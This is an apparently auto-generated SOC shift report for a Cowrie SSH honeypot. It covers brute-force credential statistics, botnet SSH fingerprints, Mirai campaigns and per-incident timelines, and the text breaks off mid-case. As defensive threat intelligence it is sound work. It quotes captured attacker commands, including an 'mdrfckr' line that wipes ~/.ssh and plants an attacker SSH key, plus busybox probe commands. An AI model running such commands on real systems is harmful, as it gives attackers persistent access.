# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-11-09 |
| **Generated At** | 2026-11-09T21:48:47Z |
| **Shift Time** | 21:48 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **376** |
| Confirmed Threats | **300** |
| False Positives Filtered | **76** (20.2%) |
| Unique Attacker IPs | **223** |
| Countries of Origin | **48** |
| High Severity Cases | **192** |
| Medium Severity Cases | **1** |
| Low Severity Cases | **183** |
| Malware Samples Analyzed | **9** HIGH · **26** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **1059** |
| Unique Credential Pairs | **725** |
| Unique Usernames | **269** |
| Unique Passwords | **528** |
| Successful Auth Pairs | **859** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 390 |
| `rootssssss23424123123` | 69 |
| `support` | 37 |
| `ubuntu` | 33 |
| `admin` | 28 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `rootssssss23424123123` | 69 |
| `root3245gs5662d34111111111` | 68 |
| `123456` | 49 |
| `support` | 35 |
| `3245gs5662d34` | 29 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `rootssssss23424123123` | `rootssssss23424123123` | 69 |
| `root` | `root3245gs5662d34111111111` | 53 |
| `support` | `support` | 35 |
| `345gs5662d34` | `345gs5662d34` | 28 |
| `root` | `3245gs5662d34` | 21 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `user1` | `password1` | `109.160.32.155` | 2026-11-09T02:55:08 |
| `root` | `12345` | `2.57.122.150` | 2026-11-09T02:55:11 |
| `elastic` | `elastic` | `109.160.32.155` | 2026-11-09T02:55:13 |
| `jenkins` | `jenkins@123` | `109.160.32.155` | 2026-11-09T02:55:16 |
| `admin1234` | `admin1234` | `109.160.32.155` | 2026-11-09T02:55:21 |
| `root` | `rootroot` | `109.160.32.155` | 2026-11-09T02:55:25 |
| `root` | `qwerty1234` | `109.160.32.155` | 2026-11-09T02:55:30 |
| `node` | `1qaz2wsx` | `109.160.32.155` | 2026-11-09T02:55:34 |
| `root` | `119110120` | `109.160.32.155` | 2026-11-09T02:55:38 |
| `root` | `a123456` | `109.160.32.155` | 2026-11-09T02:55:42 |
| `root` | `19931993` | `109.160.32.155` | 2026-11-09T02:55:47 |
| `media` | `media` | `109.160.32.155` | 2026-11-09T02:55:52 |
| `student` | `redhat` | `109.160.32.155` | 2026-11-09T02:56:01 |
| `root` | `13131313` | `109.160.32.155` | 2026-11-09T02:56:06 |
| `sedu` | `sedu` | `109.160.32.155` | 2026-11-09T02:56:10 |
| `paperclip` | `123123` | `109.160.32.155` | 2026-11-09T02:56:15 |
| `wildfly` | `Rdf@2018` | `109.160.32.155` | 2026-11-09T02:56:20 |
| `aiuser` | `qwerty` | `109.160.32.155` | 2026-11-09T02:56:24 |
| `root` | `parol` | `109.160.32.155` | 2026-11-09T02:56:30 |
| `zabbix` | `zabbix` | `109.160.32.155` | 2026-11-09T02:56:34 |
_… 839 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **376** |
| Sessions with Fingerprint | **31** |
| Unique HASSH Fingerprints | **31** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 89 |
| Go SSH scanner | 80 |
| OpenSSH | 13 |
| Unknown | 8 |
| PuTTY | 4 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 77 | 39 |
| `2ec37a7cc8da...` | Mirai/variant | 43 | 6 |
| `eff4c24daffc...` | Modern SSH client | 9 | 1 |
| `16443846184e...` | Generic scanner | 7 | 4 |
| `03a80b21afa8...` | Modern SSH client | 6 | 3 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 77 | 39 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 43 | 6 | Mirai/variant |
| `95420f9d932d...` | OpenSSH | 9 | 9 | — |
| `eff4c24daffc...` | Go SSH scanner | 9 | 1 | Modern SSH client |
| `16443846184e...` | Go SSH scanner | 7 | 4 | Generic scanner |
| `03a80b21afa8...` | libssh | 6 | 3 | Modern SSH client |
| `dd9bcf093c35...` | Unknown | 5 | 5 | Mirai/variant |
| `a289c065bf37...` | Go SSH scanner | 4 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **59** |
| Campaign Clusters | **5** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 3 | 3 | `T1105, T1140, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1083, T1140, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1592, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 64 | 42 | `T1021.004, T1078, T1070, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1140, T1059.004` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
system
```
```
shell
```
```
sh
```
```
linuxshell
```
Source IPs: `117.255.229.35`, `117.211.10.66`, `37.55.61.139`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
linuxshell
```
```
system
```
```
sh
```
```
ls /home; /bin/busybox BOTNET
```
Source IPs: `160.119.66.206`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
system
```
```
shell
```
```
sh
```
```
cat /proc/mounts; /bin/busybox IFXHX
```
Source IPs: `202.5.54.139`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **223** |
| Unique ASNs | **106** |
| High-Risk ASNs | **78** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 60 | HIGH |
| `AS396982` | Google LLC | 10 | LOW |
| `AS15169` | Google LLC | 8 | HIGH |
| `AS25369` | Hydra Communications Ltd | 6 | HIGH |
| `AS4766` | Korea Telecom | 4 | HIGH |
| `AS21859` | Zenlayer Inc | 4 | HIGH |
| `AS398324` | Censys, Inc. | 4 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 4 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (177)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-845575a09c4d

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]155` |
| **First Seen** | 2026-11-09 02:55 |
| **Last Seen** | 2026-11-09 02:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 02:55:07` | `cowrie.session.connect` |
| `2026-11-09 02:55:07` | `cowrie.client.version` |
| `2026-11-09 02:55:07` | `cowrie.client.kex` |
| `2026-11-09 02:55:08` | `cowrie.login.success` |
| `2026-11-09 02:55:09` | `cowrie.session.params` |
| `2026-11-09 02:55:09` | `cowrie.command.input` |
| `2026-11-09 02:55:10` | `cowrie.log.closed` |
| `2026-11-09 02:55:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]155` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d512be605df

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-11-09 02:55 |
| **Last Seen** | 2026-11-09 02:55 |
| **Session Duration** | 35s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_02e18c2b900fb124095dd52941f8f4ba_small_control'"'"' '"'"'check_02e18c2b900fb124095dd52941f8f4ba'"'"'', printf '\n%s|%s\n' 'check_02e18c2b900fb124095dd52941f8f4ba_small_control' 'check_02e18c2b900fb124095dd52941f8f4ba', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_02e18c2b900fb124095dd52941f8f4ba_small_math'"'"' "$((738*208+59))"', (738*208+59, printf '\n%s|%s\n' 'check_02e18c2b900fb124095dd52941f8f4ba_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 02:55:09` | `cowrie.session.connect` |
| `2026-11-09 02:55:09` | `cowrie.client.version` |
| `2026-11-09 02:55:10` | `cowrie.client.kex` |
| `2026-11-09 02:55:11` | `cowrie.login.success` |
| `2026-11-09 02:55:12` | `cowrie.client.size` |
| `2026-11-09 02:55:12` | `cowrie.session.params` |
| `2026-11-09 02:55:12` | `cowrie.command.input` |
| `2026-11-09 02:55:12` | `cowrie.command.input` |
| `2026-11-09 02:55:12` | `cowrie.command.input` |
| `2026-11-09 02:55:12` | `cowrie.command.input` |
| `2026-11-09 02:55:12` | `cowrie.command.input` |
| `2026-11-09 02:55:12` | `cowrie.command.input` |
| `2026-11-09 02:55:12` | `cowrie.command.input` |
| `2026-11-09 02:55:12` | `cowrie.command.input` |
| `2026-11-09 02:55:12` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24b91d1b3ecb

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-11-09 02:59 |
| **Last Seen** | 2026-11-09 03:00 |
| **Session Duration** | 42s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_7f264b945caac57c88fbb2ec650f7309_small_control'"'"' '"'"'check_7f264b945caac57c88fbb2ec650f7309'"'"'', printf '\n%s|%s\n' 'check_7f264b945caac57c88fbb2ec650f7309_small_control' 'check_7f264b945caac57c88fbb2ec650f7309', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_7f264b945caac57c88fbb2ec650f7309_small_math'"'"' "$((647*520+56))"', (647*520+56, printf '\n%s|%s\n' 'check_7f264b945caac57c88fbb2ec650f7309_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 02:59:32` | `cowrie.session.connect` |
| `2026-11-09 02:59:33` | `cowrie.client.version` |
| `2026-11-09 02:59:33` | `cowrie.client.kex` |
| `2026-11-09 02:59:35` | `cowrie.login.success` |
| `2026-11-09 02:59:37` | `cowrie.client.size` |
| `2026-11-09 02:59:37` | `cowrie.session.params` |
| `2026-11-09 02:59:38` | `cowrie.command.input` |
| `2026-11-09 02:59:38` | `cowrie.command.input` |
| `2026-11-09 02:59:38` | `cowrie.command.input` |
| `2026-11-09 02:59:38` | `cowrie.command.input` |
| `2026-11-09 02:59:38` | `cowrie.command.input` |
| `2026-11-09 02:59:38` | `cowrie.command.input` |
| `2026-11-09 02:59:38` | `cowrie.command.input` |
| `2026-11-09 02:59:38` | `cowrie.command.input` |
| `2026-11-09 02:59:38` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00cde7503ebe

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-11-09 03:01 |
| **Last Seen** | 2026-11-09 03:02 |
| **Session Duration** | 39s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_ed5cace92480ce51455d014ed9d55b51_small_control'"'"' '"'"'check_ed5cace92480ce51455d014ed9d55b51'"'"'', printf '\n%s|%s\n' 'check_ed5cace92480ce51455d014ed9d55b51_small_control' 'check_ed5cace92480ce51455d014ed9d55b51', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_ed5cace92480ce51455d014ed9d55b51_small_math'"'"' "$((945*662+43))"', (945*662+43, printf '\n%s|%s\n' 'check_ed5cace92480ce51455d014ed9d55b51_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 03:01:38` | `cowrie.session.connect` |
| `2026-11-09 03:01:38` | `cowrie.client.version` |
| `2026-11-09 03:01:38` | `cowrie.client.kex` |
| `2026-11-09 03:01:40` | `cowrie.login.success` |
| `2026-11-09 03:01:41` | `cowrie.client.size` |
| `2026-11-09 03:01:41` | `cowrie.session.params` |
| `2026-11-09 03:01:42` | `cowrie.command.input` |
| `2026-11-09 03:01:42` | `cowrie.command.input` |
| `2026-11-09 03:01:42` | `cowrie.command.input` |
| `2026-11-09 03:01:42` | `cowrie.command.input` |
| `2026-11-09 03:01:42` | `cowrie.command.input` |
| `2026-11-09 03:01:42` | `cowrie.command.input` |
| `2026-11-09 03:01:42` | `cowrie.command.input` |
| `2026-11-09 03:01:42` | `cowrie.command.input` |
| `2026-11-09 03:01:42` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6f5123ff080

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-11-09 03:03 |
| **Last Seen** | 2026-11-09 03:04 |
| **Session Duration** | 40s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_d10f687147e589794494d7448687233d_small_control'"'"' '"'"'check_d10f687147e589794494d7448687233d'"'"'', printf '\n%s|%s\n' 'check_d10f687147e589794494d7448687233d_small_control' 'check_d10f687147e589794494d7448687233d', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_d10f687147e589794494d7448687233d_small_math'"'"' "$((679*972+73))"', (679*972+73, printf '\n%s|%s\n' 'check_d10f687147e589794494d7448687233d_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 03:03:43` | `cowrie.session.connect` |
| `2026-11-09 03:03:44` | `cowrie.client.version` |
| `2026-11-09 03:03:44` | `cowrie.client.kex` |
| `2026-11-09 03:03:45` | `cowrie.login.success` |
| `2026-11-09 03:03:46` | `cowrie.client.size` |
| `2026-11-09 03:03:47` | `cowrie.session.params` |
| `2026-11-09 03:03:48` | `cowrie.command.input` |
| `2026-11-09 03:03:48` | `cowrie.command.input` |
| `2026-11-09 03:03:48` | `cowrie.command.input` |
| `2026-11-09 03:03:48` | `cowrie.command.input` |
| `2026-11-09 03:03:48` | `cowrie.command.input` |
| `2026-11-09 03:03:48` | `cowrie.command.input` |
| `2026-11-09 03:03:48` | `cowrie.command.input` |
| `2026-11-09 03:03:48` | `cowrie.command.input` |
| `2026-11-09 03:03:48` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffff7b2969af

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-11-09 03:05 |
| **Last Seen** | 2026-11-09 03:06 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_037d35cceeeac9d1ce6d951e1eed19f2_small_control'"'"' '"'"'check_037d35cceeeac9d1ce6d951e1eed19f2'"'"'', printf '\n%s|%s\n' 'check_037d35cceeeac9d1ce6d951e1eed19f2_small_control' 'check_037d35cceeeac9d1ce6d951e1eed19f2', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_037d35cceeeac9d1ce6d951e1eed19f2_small_math'"'"' "$((894*890+21))"', (894*890+21, printf '\n%s|%s\n' 'check_037d35cceeeac9d1ce6d951e1eed19f2_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 03:05:51` | `cowrie.session.connect` |
| `2026-11-09 03:05:51` | `cowrie.client.version` |
| `2026-11-09 03:05:51` | `cowrie.client.kex` |
| `2026-11-09 03:05:53` | `cowrie.login.success` |
| `2026-11-09 03:05:54` | `cowrie.client.size` |
| `2026-11-09 03:05:55` | `cowrie.session.params` |
| `2026-11-09 03:05:56` | `cowrie.command.input` |
| `2026-11-09 03:05:56` | `cowrie.command.input` |
| `2026-11-09 03:05:56` | `cowrie.command.input` |
| `2026-11-09 03:05:56` | `cowrie.command.input` |
| `2026-11-09 03:05:56` | `cowrie.command.input` |
| `2026-11-09 03:05:56` | `cowrie.command.input` |
| `2026-11-09 03:05:56` | `cowrie.command.input` |
| `2026-11-09 03:05:56` | `cowrie.command.input` |
| `2026-11-09 03:05:56` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eaeb782585e2

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-11-09 03:07 |
| **Last Seen** | 2026-11-09 03:08 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_60cf758b7be27c353830b61bd72190da_small_control'"'"' '"'"'check_60cf758b7be27c353830b61bd72190da'"'"'', printf '\n%s|%s\n' 'check_60cf758b7be27c353830b61bd72190da_small_control' 'check_60cf758b7be27c353830b61bd72190da', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_60cf758b7be27c353830b61bd72190da_small_math'"'"' "$((856*362+49))"', (856*362+49, printf '\n%s|%s\n' 'check_60cf758b7be27c353830b61bd72190da_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 03:07:54` | `cowrie.session.connect` |
| `2026-11-09 03:07:54` | `cowrie.client.version` |
| `2026-11-09 03:07:54` | `cowrie.client.kex` |
| `2026-11-09 03:07:55` | `cowrie.login.success` |
| `2026-11-09 03:07:57` | `cowrie.client.size` |
| `2026-11-09 03:07:57` | `cowrie.session.params` |
| `2026-11-09 03:07:58` | `cowrie.command.input` |
| `2026-11-09 03:07:58` | `cowrie.command.input` |
| `2026-11-09 03:07:58` | `cowrie.command.input` |
| `2026-11-09 03:07:58` | `cowrie.command.input` |
| `2026-11-09 03:07:58` | `cowrie.command.input` |
| `2026-11-09 03:07:58` | `cowrie.command.input` |
| `2026-11-09 03:07:58` | `cowrie.command.input` |
| `2026-11-09 03:07:58` | `cowrie.command.input` |
| `2026-11-09 03:07:58` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d980a61f9391

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-11-09 03:10 |
| **Last Seen** | 2026-11-09 03:10 |
| **Session Duration** | 41s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_746d0dcba2a67e006748746bd6f69643_small_control'"'"' '"'"'check_746d0dcba2a67e006748746bd6f69643'"'"'', printf '\n%s|%s\n' 'check_746d0dcba2a67e006748746bd6f69643_small_control' 'check_746d0dcba2a67e006748746bd6f69643', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_746d0dcba2a67e006748746bd6f69643_small_math'"'"' "$((893*559+27))"', (893*559+27, printf '\n%s|%s\n' 'check_746d0dcba2a67e006748746bd6f69643_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 03:10:02` | `cowrie.session.connect` |
| `2026-11-09 03:10:02` | `cowrie.client.version` |
| `2026-11-09 03:10:02` | `cowrie.client.kex` |
| `2026-11-09 03:10:05` | `cowrie.login.success` |
| `2026-11-09 03:10:06` | `cowrie.client.size` |
| `2026-11-09 03:10:07` | `cowrie.session.params` |
| `2026-11-09 03:10:07` | `cowrie.command.input` |
| `2026-11-09 03:10:07` | `cowrie.command.input` |
| `2026-11-09 03:10:07` | `cowrie.command.input` |
| `2026-11-09 03:10:07` | `cowrie.command.input` |
| `2026-11-09 03:10:07` | `cowrie.command.input` |
| `2026-11-09 03:10:07` | `cowrie.command.input` |
| `2026-11-09 03:10:07` | `cowrie.command.input` |
| `2026-11-09 03:10:07` | `cowrie.command.input` |
| `2026-11-09 03:10:07` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea53d21e48e9

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-11-09 03:12 |
| **Last Seen** | 2026-11-09 03:12 |
| **Session Duration** | 38s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_13c07afd2e12dab6d8cc5dd605ce3e3f_small_control'"'"' '"'"'check_13c07afd2e12dab6d8cc5dd605ce3e3f'"'"'', printf '\n%s|%s\n' 'check_13c07afd2e12dab6d8cc5dd605ce3e3f_small_control' 'check_13c07afd2e12dab6d8cc5dd605ce3e3f', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_13c07afd2e12dab6d8cc5dd605ce3e3f_small_math'"'"' "$((72*765+13))"', (72*765+13, printf '\n%s|%s\n' 'check_13c07afd2e12dab6d8cc5dd605ce3e3f_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 03:12:14` | `cowrie.session.connect` |
| `2026-11-09 03:12:14` | `cowrie.client.version` |
| `2026-11-09 03:12:15` | `cowrie.client.kex` |
| `2026-11-09 03:12:16` | `cowrie.login.success` |
| `2026-11-09 03:12:18` | `cowrie.client.size` |
| `2026-11-09 03:12:18` | `cowrie.session.params` |
| `2026-11-09 03:12:18` | `cowrie.command.input` |
| `2026-11-09 03:12:18` | `cowrie.command.input` |
| `2026-11-09 03:12:18` | `cowrie.command.input` |
| `2026-11-09 03:12:18` | `cowrie.command.input` |
| `2026-11-09 03:12:18` | `cowrie.command.input` |
| `2026-11-09 03:12:18` | `cowrie.command.input` |
| `2026-11-09 03:12:18` | `cowrie.command.input` |
| `2026-11-09 03:12:18` | `cowrie.command.input` |
| `2026-11-09 03:12:18` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f9fd7b9f6ca

| Field | Detail |
|---|---|
| **Source IP** | `221.132.21[.]185` |
| **First Seen** | 2026-11-09 03:12 |
| **Last Seen** | 2026-11-09 03:13 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 03:12:56` | `cowrie.session.connect` |
| `2026-11-09 03:12:56` | `cowrie.client.version` |
| `2026-11-09 03:12:56` | `cowrie.client.kex` |
| `2026-11-09 03:12:57` | `cowrie.login.success` |
| `2026-11-09 03:12:58` | `cowrie.session.params` |
| `2026-11-09 03:12:58` | `cowrie.command.input` |
| `2026-11-09 03:12:58` | `cowrie.command.failed` |
| `2026-11-09 03:12:59` | `cowrie.log.closed` |
| `2026-11-09 03:13:00` | `cowrie.session.params` |
| `2026-11-09 03:13:00` | `cowrie.command.input` |
| `2026-11-09 03:13:00` | `cowrie.session.file_download` |
| `2026-11-09 03:13:00` | `cowrie.log.closed` |
| `2026-11-09 03:13:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.132.21[.]185` to AbuseIPDB if not already reported
- [ ] Block `221.132.21[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c20f454f9c70

| Field | Detail |
|---|---|
| **Source IP** | `221.132.21[.]185` |
| **First Seen** | 2026-11-09 03:13 |
| **Last Seen** | 2026-11-09 03:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 03:13:01` | `cowrie.session.connect` |
| `2026-11-09 03:13:01` | `cowrie.client.version` |
| `2026-11-09 03:13:01` | `cowrie.client.kex` |
| `2026-11-09 03:13:02` | `cowrie.login.success` |
| `2026-11-09 03:13:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.132.21[.]185` to AbuseIPDB if not already reported
- [ ] Block `221.132.21[.]185` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc73ba1a951b

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-11-09 03:14 |
| **Last Seen** | 2026-11-09 03:15 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
